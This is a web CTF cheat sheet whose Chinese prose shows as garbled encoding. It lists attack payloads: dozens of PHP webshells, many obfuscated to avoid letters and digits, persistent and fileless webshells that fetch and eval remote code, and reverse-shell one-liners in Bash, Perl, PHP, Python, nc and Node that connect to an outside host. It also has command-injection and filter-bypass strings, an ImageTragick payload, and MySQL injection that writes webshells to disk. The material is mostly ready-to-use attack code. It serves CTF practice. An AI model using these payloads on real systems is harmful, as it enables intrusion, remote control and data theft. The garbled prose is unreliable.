WEB CTF CheatSheet
===

Table of Contents
=================

*  [Webshell](#webshell)
    * [Reverse Shell](#reverse-shell)
*  [PHP Tag](#php-tag)
*  [PHP Weak Type](#php-weak-type)
*  [PHP Feature](#php-å…¶ä»–ç‰¹æ€§)
*  [Command Injection](#command-injection)
    * [Bypass Space](#ç©ºç™½ç»•è¿‡)
    * [Bypass Keyword](#keywordç»•è¿‡)
    * [ImageMagick](#imagemagick-imagetragick)
    * [Ruby Command Executing](#ruby-command-executing)
    * [Python Command Executing](#python-command-executing)
*  [SQL Injection](#sql-injection)
    * [MySQL](#mysql)
    * [MSSQL](#mssql)
    * [Oracle](#oracle)
    * [SQLite](#sqlite)
    * [Postgresql](#postgresql)
*  [LFI](#lfi)
*  [Upload](#ä¸Šä¼ æ¼æ´)
*  [Serialization](#ååºåˆ—åŒ–)
    * [PHP Serialize](#php---serialize--unserialize)
    * [Python Pickle](#python-pickle)
    * [Ruby Marshal](#rubyrails-marshal)
    * [Ruby ML](#rubyrails-yaml)
*  [SSTI](#ssti)
    * [Flask/Jinja2](#flaskjinja2)
    * [AngularJS](#angularjs)
    * [Vue.js](#vuejs)
    * [Python](#python)
    * [Tool](#tool)
*  [SSRF](#ssrf)
    * [Bypass](#bypass-127001)
    * [Local Expolit](#æœ¬åœ°åˆ©ç”¨)
    * [Remote Expolit](#è¿œç¨‹åˆ©ç”¨)
    * [CRLF Injection](#crlf-injection)
    * [Finger Print](#fingerprint)
*  [XXE](#xxe)
    * [Out of Band XXE](#out-of-band-oob-xxe)
*  [XSS](#xss)
*  [Crypto](#å¯†ç å­¦)
    * [PRNG](#prng)
    * [ECB mode](#ecb-mode)
    * [CBC mode](#cbc-mode)
    * [Length Extension Attack](#length-extension-attack)
*  [Others](#å…¶å®ƒ-1)
*  [Tools and Website](#tool--online-website)
    * [Information Gathering](#information-gathering)
    * [Social Engineering](#social-engineering)
    * [Crack](#crack)


# Webshell
```php
<?php system($_GET["cmd"]); ?>
<?php system($_GET[1]); ?>
<?php system("`$_GET[1]`"); ?>
<?= system($_GET[cmd]);
<?php eval($_POST[cmd]);?>
<?php echo `$_GET[1]`;
<?php echo passthru($_GET['cmd']);
<?php echo shell_exec($_GET['cmd']);
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
<script language="php">system("id"); </script>

<?php $_GET['a']($_GET['b']); ?>
// a=system&b=ls
// a=assert&b=system("ls")

<?php array_map("ass\x65rt",(array)$_REQUEST['cmd']);?>
// .php?cmd=system("ls")

<?@extract($_REQUEST);@die($f($c));?>
// .php?f=system&c=id

<?php @include($_FILES['u']['tmp_name']);  
// æ„é€  <form action="http://x.x.x.x/shell.php" method="POST" enctype="multipart/form-data">ä¸Šä¼ 
// æŠŠæš‚å­˜æ¡£includeè¿›æ¥
// From: http://www.zeroplace.cn/article.asp?id=906

<?php $x=~Â¾Â¬Â¬ÂºÂ­Â«;$x($_GET['a']); ?>
// not backdoor (assert)
// .php?a=system("ls")

echo "{${phpinfo()}}";

echo "${system(ls)}";

echo Y2F0IGZsYWc= | base64 -d | sh
// Y2F0IGZsYWc=   =>  cat  flag

echo -e "<?php passthru(\$_POST[1])?>;\r<?php echo 'A PHP Test ';" > shell.php
// cat shell.php
// <?php echo 'A PHP Test ';" ?>

echo ^<?php eval^($_POST['a']^); ?^> > a.php
// Windows echoå¯¼å‡ºä¸€å¥è¯

<?php fwrite(fopen("gggg.php","w"),"<?php system(\$_GET['a']);");

<?php
header('HTTP/1.1 404');
ob_start();
phpinfo();
ob_end_clean();
?>

<?php 
// æ— å›æ˜¾åé—¨  
// e.g. ?pass=file_get_contents('http://kaibro.tw/test')
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();
?>

// æ— è‹±æ–‡æ•°å­—çš„webshell 1
<?=
$ğŸ’© = '[[[[@@' ^ '("(/%-';
$ğŸ’©(('@@['^'#!/')." /????");

// æ— è‹±æ–‡æ•°å­—çš„webshell 2
<?php
$_=(chr(0x01)^'`').(chr(0x13)^'`').(chr(0x13)^'`').(chr(0x05)^'`').(chr(0x12)^'`').(chr(0x14)^'`');
$__='_'.(chr(0x0D)^']').(chr(0x2F)^'`').(chr(0x0E)^']').(chr(0x09)^']');
$___=$$__;
$_($___[_]);// assert($_POST[_]);
?>

// æ— è‹±æ–‡æ•°å­—çš„webshell 3
<?php
$_=(urldecode('%01')^'`').(urldecode('%13')^'`').(urldecode('%13')^'`').(urldecode('%05')^'`').(urldecode('%12')^'`').(urldecode('%14')^'`');
$__='_'.(urldecode('%0D')^']').(urldecode('%2F')^'`').(urldecode('%0E')^']').(urldecode('%09')^']');
$___=$$__;
$_($___[_]);// assert($_POST[_]);
?>

// æ— è‹±æ–‡æ•°å­—çš„webshell 4
<?php
$__=('>'>'<')+('>'>'<');
$_=$__/$__;
$____='';
$___="ç°";$____.=~($___{$_});$___="å’Œ";$____.=~($___{$__});$___="å’Œ";$____.=~($___{$__});$___="çš„";$____.=~($___{$_});$___="åŠ";$____.=~($___{$_});$___="å§‹";$____.=~($___{$__});

// æ— è‹±æ–‡æ•°å­—çš„webshell 5
$_____='_';$___="ä¿¯";$_____.=~($___{$__});$___="ç°";$_____.=~($___{$__});$___="æ¬¡";$_____.=~($___{$_});$___="ç«™";$_____.=~($___{$_});
$_=$$_____;
$____($_[_]);// assert($_POST[_]);

// æ— è‹±æ–‡æ•°å­—çš„webshell 6
<?php
$__=[];
$___=[];
$_=$__==$___;
$__=~(ç°);
$___=$__[$_];
$__=~(åŒ—);
$___.=$__[$_].$__[$_];
$__=~(çš„);
$___.=$__[$_];
$__=~(åŠ);
$___.=$__[$_];
$__=~(æ‹¾);
$___.=$__[$_];
$____=~(~(_));
$__=~(è¯´);
$____.=$__[$_];
$__=~(å°);
$____.=$__[$_];
$__=~(æ¬¡);
$____.=$__[$_];
$__=~(ç«™);
$____.=$__[$_];
$_=$$____;
$___($_[_]);// assert($_POST[_]);

// æ— è‹±æ–‡æ•°å­—çš„webshell 7
<?php
    @$_=[].'';
    @$___=$_[''];
    $_=$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;
    $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;
    $____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;
    @$___($_[_]);// assert($_POST[_]);
?>


A=fl;B=ag;cat $A$B

```

## webshell å†…å­˜é©»ç•™

è§£æ³•ï¼šrestart
```php
<?php
    ignore_user_abort(true);  // å¿½ç•¥è¿çº¿ä¸­æ–­
    set_time_limit(0);  // è®¾å®šæ— æ‰§è¡Œæ—¶é—´ä¸Šé™
    $file = 'shell.php';
    $code = '<?php eval($_POST[a]);?>';
    while(md5(file_get_contents($file)) !== md5($code)) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>

```

## æ— æ–‡ä»¶webshell

è§£æ³•ï¼šrestart
```php
<?php  
    unlink(__FILE__);  
    ignore_user_abort(true);  
    set_time_limit(0);  
    $remote_file = 'http://xxx/xxx.txt';  
    while($code = file_get_contents($remote_file)){  
        @eval($code);  
        sleep(5);  
    };  

?>  
```


## Reverse Shell

- æœ¬æœºListen Port
    - `ncat -vl 5566`

- Perl
    - `perl -e 'use Socket;$i="kaibro.tw";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

- Bash
    - `bash -i >& /dev/tcp/kaibro.tw/5566 0>&1`
    - `bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
    - `0<&196;exec 196<>/dev/tcp/kaibro.tw/5566; sh <&196 >&196 2>&196`

- PHP
    - `php -r '$sock=fsockopen("kaibro.tw",5566);exec("/bin/sh -i <&3 >&3 2>&3");'`

- NC
    - `nc -e /bin/sh kaibro.tw 5566`

- Python
    - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("kaibro.tw",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

- Node.js
    - `var net = require("net"), sh = require("child_process").exec("/bin/bash"); var client = new net.Socket(); client.connect(5566, "kaibro.tw", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});`
    - `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'");`

# PHP Tag

- `<? ?>`
    - short_open_tag å†³å®šæ˜¯å¦å¯ä½¿ç”¨çŸ­æ ‡è®°
    - æˆ–æ˜¯ç¼–è¯‘phpæ—¶ --enable-short-tags
- `<?=`
    - ç­‰ä»· <? echo
    - è‡ª`PHP 5.4.0`èµ·ï¼Œalways work!
- `<% %>`ã€`<%=`
    - è‡ª`PHP 7.0.0`èµ·ï¼Œè¢«ç§»é™¤
    - é¡»å°†`asp_tags`è®¾æˆOn
- `<script language="php"`
    - è‡ª`PHP 7.0.0`èµ·ï¼Œè¢«ç§»é™¤
    - `<script language="php">system("id"); </script>`



# PHP Weak Type

- `var_dump('0xABCdef'       == '     0xABCdef');`
    * true           (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)

- `var_dump('0010e2'         == '1e3â€™);`
    - true
- `strcmp([],[])`
    - 0
- `sha1([])`
    - NULL
- `'123' == 123`
- `'abc' == 0`
- `'123a' == 123`
- `'0x01' == 1`
    - PHP 7.0åï¼Œ16è¿›åˆ¶å­—ç¬¦ä¸²ä¸å†å½“æˆæ•°å­—
    - e.g `var_dump('0x01' == 1)` => false
- `'' == 0 == false == NULL`
- `md5([1,2,3]) == md5([4,5,6]) == NULL`
    - å¯ç”¨åœ¨ç™»å…¥ç»•è¿‡ (ç”¨æˆ·ä¸å­˜åœ¨ï¼Œåˆ™passwordä¸ºNULL)
- `var_dump(md5(240610708));`
    - 0e462097431906509019562988736854
- `var_dump(sha1(10932435112));`
    - 0e07766915004133176347055865026311692244
- `$a="123"; $b="456"`
    - `$a + $b == "579";`
    - `$a . $b == "123456"`

- `$a = 0; $b = 'x';`
    - `$a == false` => true
    - `$a == $b` => true
    - `$b == true` => true

- `$a = 'a'`
    - `++$a` => `'b'`
    - `$a+1` => `1`


# PHP å…¶ä»–ç‰¹æ€§

## Overflow

- 32ä½
    - `intval('1000000000000')` => `2147483647`
- 64ä½
    - `intval('100000000000000000000')` => `9223372036854775807`

## æµ®ç‚¹æ•°ç²¾åº¦

- `php -r "var_dump(1.000000000000001 == 1);"`
    - false

- `php -r "var_dump(1.0000000000000001 == 1);"`
    - true

- `$a = 0.1 * 0.1; var_dump($a == 0.01);`
    - false

## eregä¼šè¢«NULLæˆªæ–­

- `var_dump(ereg("^[a-zA-Z0-9]+$", "1234\x00-!@#%"));`
    - `1`
- `ereg`å’Œ`eregi`åœ¨PHP 7.0.0.å·²ç»è¢«ç§»é™¤

## intval

- å››èˆäº”å…¥
    - `var_dump(intval('5278.8787'));`
        - `5278`
- `intval(012)` => 10
- `intval("012")` => 12

## extractå˜é‡è¦†ç›–

- `extract($_GET);`
    - `.php?_SESSION[name]=admin`
    - `echo $_SESSION['name']` => 'admin'

## trim

- ä¼šæŠŠå­—ç¬¦ä¸²å‰åçš„ç©ºç™½(æˆ–å…¶ä»–å­—å…ƒ)å»æ‰
- æœªæŒ‡å®šç¬¬äºŒå‚æ•°ï¼Œé¢„è®¾ä¼šå»æ‰ä»¥ä¸‹å­—å…ƒ
    - `" "` (0x20)
    - `"\t"` (0x09)
    - `"\n"` (0x0A)
    - `"\x0B"` (0x0B)
    - `"\r"` (0x0D)
    - `"\0"` (0x00)
- å¯ä»¥å‘ç°é¢„è®¾ä¸åŒ…å«`"\f"` (0x0C)
    - æ¯”è¾ƒï¼šis_numeric()å…è®¸`\f`åœ¨å¼€å¤´
- å¦‚æœå‚æ•°æ˜¯unsetæˆ–ç©ºçš„å˜é‡ï¼Œè¿”å›å€¼æ˜¯ç©ºå­—ç¬¦ä¸²

## is_numeric

- `is_numeric(" \t\r\n 123")` => `true`

- `is_numeric(' 87')` => `true`
- `is_numeric('87 ')` => `false`
- `is_numeric(' 87 ')` => `false`
- `is_numeric('0xdeadbeef')`
    - PHP >= 7.0.0 => `false`
    - PHP < 7.0.0 => `true`
    - å¯ä»¥æ‹¿æ¥ç»•è¿‡æ³¨å…¥
- ä»¥ä¸‹äº¦ä¸ºåˆæ³•(è¿”å›True)å­—ç¬¦ä¸²:
    - `' -.0'`
    - `'0.'`
    - `' +2.1e5'`
    - `' -1.5E+25'`
    - `'1.e5'`

## in_array

- `in_array('5 or 1=1', array(1, 2, 3, 4, 5))`
    - true
- `in_array('kaibro', array(0, 1, 2))`
    - true
- `in_array(array(), array('kai'=>false))`
    - true
- `in_array(array(), array('kai'=>null))`
    - true
- `in_array(array(), array('kai'=>0))`
    - false
- `in_array(array(), array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>true))`
    - true
- `in_array('kai', array('kai'=>'bro'))`
    - false
- `in_array('kai', array('kai'=>0))`
    - true
- `in_array('kai', array('kai'=>1))`
    - false

## array_search

- `mixed array_search(mixed $needle , array $haystack [, bool $strict = false ])`
    - åœ¨`haystack`æ•°ç»„ä¸­ï¼Œæœå¯»`needle`çš„å€¼ï¼ŒæˆåŠŸåˆ™è¿”å›indexï¼Œå¤±è´¥è¿”å›False
- `$strict`ä¸ºfalseæ—¶ï¼Œé‡‡ç”¨ä¸ä¸¥æ ¼æ¯”è¾ƒ
    - é¢„è®¾æ˜¯False
- Example
    - `$arr=array(1,2,0); var_dump(array_search('kai', $arr))`
        - `int(2)`
    - `$arr=array(1,2,0); var_dump(array_search('1', $arr))`
        - `int(0)`

## parse_str
- `parse_str(string, array)`
- ä¼šæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­
- å¦‚æœæœªè®¾ç½®ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¼šè§£æåˆ°åŒåå˜é‡ä¸­
    - PHP7.2ä¸­ä¸è®¾ç½®ç¬¬äºŒä¸ªå‚æ•°ä¼šäº§ç”Ÿ`E_DEPRECATED`è­¦å‘Š
- `parse_str('gg[kaibro]=5566');`

    ```
    array(1) {
      ["kaibro"]=>
        string(4) "5566"
    }

    ```
- PHPå˜é‡æœ‰ç©ºæ ¼å’Œ.ï¼Œä¼šè¢«è½¬æˆåº•çº¿
    
    ```
    parse_str("na.me=kaibro&pass wd=ggininder",$test);
    var_dump($test);
    
    array(2) { 
        ["na_me"]=> string(6) "kaibro" 
        ["pass_wd"]=> string(9) "ggininder" 
    } 
    ```


## parse_url

- åœ¨å¤„ç†ä¼ å…¥çš„URLä¼šæœ‰é—®é¢˜
- `parse_url('/a.php?id=1')`
    
    ```
    array(2) {
      ["host"]=>
        string(5) "a.php"
      ["query"]=>
        string(4) "id=1"
    }
    ```
- `parse_url('//a/b')`
    - host: `a`
- `parse_url('..//a/b/c:80')`
    - host: `..`
    - port: `80`
    - path: `//a/b/c:80`
- `parse_url('///a.php?id=1')`
    - false

- `parse_url('/a.php?id=1:80')`
     - PHP < 7.0.0
         - `false`
     - PHP >= 7.0.0
       ```
         array(2) { 
             ["path"]=> string(6) "/a.php" 
             ["query"]=> string(7) "id=1:80" 
         }
       ```

- `parse_url('http://kaibro.tw:87878')`
    - 5.3.Xç‰ˆæœ¬ä»¥ä¸‹
        ```php
        array(3) { 
            ["scheme"]=> string(4) "http" 
            ["host"]=> string(9) "kaibro.tw" 
            ["port"]=> int(22342) 
        }
        ```
    - å…¶ä»–ï¼š false

## preg_replace

- `mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )`
    - æœå¯»`$subject`ä¸­åŒ¹é…çš„`$pattern`ï¼Œå¹¶ç”¨`$replacement`æ›¿æ¢
- ç¬¬ä¸€ä¸ªå‚æ•°ç”¨`/e`ä¿®é¥°ç¬¦ï¼Œ`$replacement`ä¼šè¢«å½“æˆPHP codeæ‰§è¡Œ
    - å¿…é¡»æœ‰åŒ¹é…åˆ°æ‰ä¼šæ‰§è¡Œ
    - PHP 5.5.0èµ·ï¼Œä¼šäº§ç”Ÿ`E_DEPRECATED`é”™è¯¯
    - PHP 7.0.0ä¸å†æ”¯æŒï¼Œç”¨`preg_replace_callback()`ä»£æ›¿

example:

```php
<?php
$a='phpkaibro';
echo preg_replace('/(.*)kaibro/e','\\1info()',$a);
```

## sprintf / vprintf

- å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç±»å‹æ²¡æ£€æŸ¥
- æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­%åé¢çš„å­—å…ƒ(é™¤äº†%ä¹‹å¤–)ä¼šè¢«å½“æˆå­—ç¬¦ä¸²ç±»å‹åƒæ‰
    - ä¾‹å¦‚`%\`ã€`%'`ã€`%1$\'`
    - åœ¨æŸäº›SQLiè¿‡æ»¤çŠ¶å†µä¸‹ï¼Œ`%' and 1=1#`ä¸­çš„å•å¼•å·ä¼šè¢«è½¬ä¹‰æˆ`\'`ï¼Œ`%\`åˆä¼šè¢«åƒæ‰ï¼Œ`'`æˆåŠŸé€ƒé€¸
    - åŸç†ï¼šsprintfå®ä½œæ˜¯ç”¨switch...case...
        - ç¢°åˆ°æœªçŸ¥ç±»å‹ï¼Œ`default`ä¸å¤„ç†

## file_put_contents

- ç¬¬äºŒä¸ªå‚æ•°å¦‚æœæ˜¯æ•°ç»„ï¼ŒPHPä¼šæŠŠå®ƒä¸²æ¥æˆå­—ç¬¦ä¸²
- example:
    ```php
    <?php
    $test = $_GET['txt'];
    if(preg_match('[<>?]', $test)) die('bye');
    file_put_contents('output', $test);
    ```
    - å¯ä»¥ç›´æ¥`?txt[]=<?php phpinfo(); ?>`å†™å…¥

## spl_autoload_register

- `spl_autoload_register()`å¯ä»¥è‡ªåŠ¨è½½å…¥Class
- ä¸æŒ‡å®šå‚æ•°ï¼Œä¼šè‡ªåŠ¨è½½å…¥`.inc`å’Œ`.php`
- Example:
    - å¦‚æœç›®å½•ä¸‹æœ‰kaibro.incï¼Œä¸”å†…å®¹ä¸ºclass Kaibro{...}
    - åˆ™`spl_autoload_register()`ä¼šæŠŠè¿™ä¸ªClassè½½å…¥è¿›æ¥


## è·¯å¾„æ­£è§„åŒ–

- `a.php/.`
    - `file_put_contents("a.php/.", "<?php phpinfo() ?>");`
        - å¯æˆåŠŸå†™å…¥
            - ç»æµ‹è¯•Windowså¯ä»¥è¦†å†™ã€Linuxæ— æ³•
        - å¯ä»¥ç»•è¿‡ä¸€äº›æ­£è§„è¡¨è¾¾å¼åˆ¤æ–­
    - `file_get_contents("a.php/.");`
        - ç»æµ‹è¯•Windowsä¸‹å¯æˆåŠŸè¯»ã€Linuxæ— æ³•
    - è¿˜æœ‰å¾ˆå¤šå…¶ä»–functionä¹Ÿé€‚ç”¨
- `"` => `.`
    - `a"php`
- `>` => `?`
    - `a.p>p`
    - `a.>>>`
- `<` => `*`
    - `a.<`

## URL query decode
- `$_GET`ä¼šå¯¹ä¼ å…¥çš„å‚æ•°åšURLdecodeå†è¿”å›
- `$_SERVER['REQUEST_URI']`å’Œ`$_SERVER['QUERY_STRING']`åˆ™æ˜¯ç›´æ¥è¿”å›

Example:

Request: `http://kaibro.tw/test.php?url=%67%67`
    
* $_GET: `[url] => gg`

* $_SERVER['REQUEST_URI']: `/test.php?url=%67%67`
    
* $_SERVER['QUERY_STRING']: `url=%67%67`

## OPcache

- é€è¿‡å°†PHPè„šæœ¬ç¼–è¯‘æˆByte codeçš„æ–¹å¼åšCacheæ¥æå‡æ€§èƒ½
- ç›¸å…³è®¾å®šåœ¨php.iniä¸­
    - `opcache.enable` æ˜¯å¦å¯ç”¨
    - `opcache.file_cache` è®¾å®šcacheç›®å½•
        - ä¾‹å¦‚:`opcache.file_cache="/tmp/opcache"`
        - `/var/www/index.php`çš„æš‚å­˜ä¼šæ”¾åœ¨`/tmp/opcache/[system_id]/var/www/index.php.bin`
    - `opcache.file_cache_only` è®¾å®šcacheæ–‡ä»¶ä¼˜å…ˆçº§
    - `opcache.validate_timestamps` æ˜¯å¦å¯ç”¨timestampéªŒè¯
- `system_id`æ˜¯é€è¿‡Zendå’ŒPHPç‰ˆæœ¬å·è®¡ç®—å‡ºæ¥çš„ï¼Œå¯ä»¥ç¡®ä¿ç›¸å®¹æ€§
- æ‰€ä»¥åœ¨æŸäº›æ¡ä»¶ä¸‹å¯é€è¿‡ä¸Šä¼ è¦†ç›–æš‚å­˜æ–‡ä»¶æ¥å†™webshell
    - system_idè¦å’Œç›®æ ‡æœºå™¨ä¸€æ ·
    - timestampè¦ä¸€è‡´
- https://github.com/GoSecure/php7-opcache-override
    - Disassemblerå¯ä»¥æŠŠByte codeè½¬æˆPseudo code


## å…¶ä»–

- å¤§å°å†™ä¸æ•æ„Ÿ
    - `<?PhP sYstEm(ls);`
- `echo (true ? 'a' : false ? 'b' : 'c');`
    - `b`
- ```echo `whoami`; ```
    - `kaibro`
- æ­£è§„è¡¨è¾¾å¼`.`ä¸åŒ¹é…æ¢è¡Œå­—å…ƒ`%0a`
- è¿ç®—ä¼˜å…ˆæƒé—®é¢˜
    - `$a = true && false;`
        - `$a` => `false`
    - `$a = true and false;`
        - `$a` => `true`
- chr()
    - å¤§äº256ä¼šmod 256
    - å°äº0ä¼šåŠ ä¸Š256çš„å€æ•°ï¼Œç›´åˆ°>0
    - Example:
        - `chr(259) === chr(3)`
        - `chr(-87) === chr(169)`

- é€’å¢
    - `$a="9D9"; var_dump(++$a);`
        - `string(3) "9E0"`
    - `$a="9E0"; var_dump(++$a);`
        - `float(10)`

- ç®—æ•°è¿ç®—ç»•Filter
    - `%f3%f9%f3%f4%e5%ed & %7f%7f%7f%7f%7f%7f`
        - `system`
        - å¯ç”¨åœ¨é™åˆ¶ä¸èƒ½å‡ºç°è‹±æ•°å­—æ—¶ or è¿‡æ»¤æŸäº›ç‰¹æ®Šç¬¦å·
    - ```$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');```
        - `assert`
    - å…¶ä»–
        - `~`, `++`ç­‰è¿ç®—ï¼Œä¹Ÿéƒ½å¯ç”¨ç±»ä¼¼æ¦‚å¿µæ„é€ 

- èŠ±æ‹¬å·
    - æ•°ç»„ã€å­—ç¬¦ä¸²å…ƒç´ å­˜å–å¯ç”¨èŠ±æ‹¬å·
    - `$array{index}`åŒ`$array[index]`

- filter_var
    - `filter_var('http://evil.com;google.com', FILTER_VALIDATE_URL)`
        - False
    - `filter_var('0://evil.com;google.com', FILTER_VALIDATE_URL)`
        - True

- json_decode
    - ä¸ç›´æ¥åƒæ‰æ¢è¡Œå­—å…ƒå’Œ\tå­—å…ƒ
    - ä½†å¯ä»¥åƒæ‰'\n'å’Œ'\t'
        - ä¼šè½¬æˆæ¢è¡Œå­—å…ƒå’ŒTab

- === bug
    - `var_dump([0 => 0] === [0x100000000 => 0])`
        - æŸäº›ç‰ˆæœ¬ä¼šæ˜¯True
        - ASIS 2018 Qual Nice Code
    - https://3v4l.org/sUEMG
- openssl_verify
    - é¢„æµ‹æ¡ç”¨SHA1æ¥åšç­¾åï¼Œå¯èƒ½æœ‰SHA1 Collisioné—®é¢˜
    - DEFCON CTF 2018 Qual


# Command Injection

```
| cat flag
&& cat flag
; cat flag
%0a cat flag
"; cat flag
`cat flag`
cat $(ls)
"; cat $(ls)
`cat flag | nc kaibro.tw 5278`

. flag
PS1=$(cat flag)

`echo${IFS}${PATH}|cut${IFS}-c1-1`
=> /
```

## ? and *
- `?` match one character
    - `cat fl?g`
    - `/???/??t /???/p??s??`
- `*` match å¤šä¸ª
    - `cat f*`
    - `cat f?a*`

## ç©ºç™½ç»•è¿‡

- `${IFS}`
    - `cat${IFS}flag`
    - `ls$IFS-alh`
    - `cat$IFS$2flag`
- `cat</etc/passwd`
- `{cat,/etc/passwd}`
- `X=$'cat\x20/etc/passwd'&&$X`
- ``` IFS=,;`cat<<<uname,-a` ```
    - bash only


## Keywordç»•è¿‡

- String Concat
    - `A=fl;B=ag;cat $A$B`
- Empty Variable
    - `cat fl${x}ag`
    - `cat tes$(z)t/flag`
    
- Environment Variable
    - `$PATH => "/usr/local/â€¦.blablablaâ€`
        - `${PATH:0:1}   => '/'`
        - `${PATH:1:1}   => 'u'`
        - `${PATH:0:4}   => '/usr'`
    - `${PS2}` 
        - `>`
    - `${PS4}`
        - `+`
- Empty String
    - `cat fl""ag`
    - `cat fl''ag`
        - `cat "fl""ag"`

- åæ–œçº¿
    - `c\at fl\ag`

## ImageMagick (ImageTragick)

- CVE-2016-3714
- `mvg`æ ¼å¼åŒ…å«httpså¤„ç†(ä½¿ç”¨curlä¸‹è½½)ï¼Œå¯ä»¥é—­åˆåŒå¼•å·
- payload:

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://kaibro.tw";ls "-la)'
pop graphic-context
```

## Ruby Command Executing

- `open("| ls")`
- `IO.popen("ls").read`
- `Kernel.exec("ls")`
- ``` `ls` ```
- `system("ls")`
- `eval("ruby code")`
    - Non-Alphanumeric example: HITCON CTF 2015 - Hard to say
        - `$$/$$` => 1
        - `'' << 97 << 98 << 99` => "abc"
        - `$:`å³`$LOAD_PATH`
- `exec("ls")`
- `%x{ls}`
- Net::FTP
    - CVE-2017-17405
    - use `Kernel#open`

## Python Command Executing
- `os.system("ls")`
- `os.popen("ls").read()`
- `os.execl("/bin/ls","")`
- `os.execlp("ls","")`
- `os.execv("/bin/ls",[''])`
- `os.execvp("/bin/ls",[""])`
- `subprocess.call("ls")`
    - `subprocess.call("ls|cat",shell=False)` => Fail
    - `subprocess.call("ls|cat",shell=True)` => Correct
- `eval("__import__('os').system('ls')")`
- `exec("__import__('os').system('ls')")`
- `commands.getoutput('ls')`

## Read File

- diff /etc/passwd /flag
- paste /flag
- bzmore /flag
- bzless /flag
- static-sh /flag
- ...

# SQL Injection


## MySQL

- å­å­—ç¬¦ä¸²ï¼š
    - `substr("abc",1,1) => 'a'`
    - `mid("abc", 1, 1)  => 'a'`
- Ascii function
    - `ascii('A') => 65 `
- Char function
    - `char(65) => 'a'`
- Concatenation
    - `CONCAT('a', 'b') => 'ab'`
        - å¦‚æœä»»ä½•ä¸€æ ä¸ºNULLï¼Œåˆ™è¿”å›NULL
    - `CONCAT_WS(åˆ†éš”ç¬¦, å­—ç¬¦ä¸²1, å­—ç¬¦ä¸²2...)`
        - `CONCAT_WS('@', 'gg', 'inin')` => `gg@inin`
- Cast function
    - `CAST('125e342.83' AS signed) => 125`
    - `CONVERT('23',SIGNED) => 23`
- Delay function
    - `sleep(5)`
    - `BENCHMARK(count, expr)`
- ç©ºç™½å­—å…ƒ
    - `09 0A 0B 0C 0D A0 20`
- File-read function
    - `LOAD_FILE('/etc/passwd')`
- File-write
    - `INTO DUMPFILE`
        - é€‚ç”¨binary (å†™å…¥åŒä¸€è¡Œ)
    - `INTO OUTFILE`
        - é€‚ç”¨ä¸€èˆ¬æ–‡æœ¬ (æœ‰æ¢è¡Œ)
    - å†™webshell
        - éœ€çŸ¥é“å¯å†™è·¯å¾„
        - `UNION SELECT "<? system($_GET[1]);?>",2,3 INTO OUTFILE "/var/www/html/temp/shell.php"`
    - æƒé™
        - `SELECT file_priv FROM mysql.user`
    - secure-file-priv
        - é™åˆ¶MySQLå¯¼å…¥å¯¼å‡º
            - load_file, into outfileç­‰
        - è¿è¡Œæ—¶æ— æ³•æ›´æ”¹
        - MySQL 5.5.53å‰ï¼Œè¯¥å˜é‡é¢„è®¾ä¸ºç©º(å¯ä»¥å¯¼å…¥å¯¼å‡º)
        - e.g. `secure_file_priv=E:\`
            - é™åˆ¶å¯¼å…¥å¯¼å‡ºåªèƒ½åœ¨E:\ä¸‹
        - e.g. `secure_file_priv=null`
            - é™åˆ¶ä¸å…è®¸å¯¼å…¥å¯¼å‡º    
        - secure-file-privé™åˆ¶ä¸‹ç”¨general_logæ‹¿shell
        ```
        SET global general_log='on';

        SET global general_log_file='C:/phpStudy/WWW/cmd.php';

        SELECT '<?php assert($_POST["cmd"]);?>';
        ```
- IFè¯­å¥
    - IF(condition,true-part,false-part)
    - `SELECT IF (1=1,'true','false')`
- Hex
    - `SELECT X'5061756c';  =>  paul`
    - `SELECT 0x5061756c; => paul`
    - `SELECT 0x5061756c+0 => 1348564332`
    - `SELECT load_file(0x2F6574632F706173737764);`
        - /etc/passwd
    - å¯ç»•è¿‡ä¸€äº›WAF
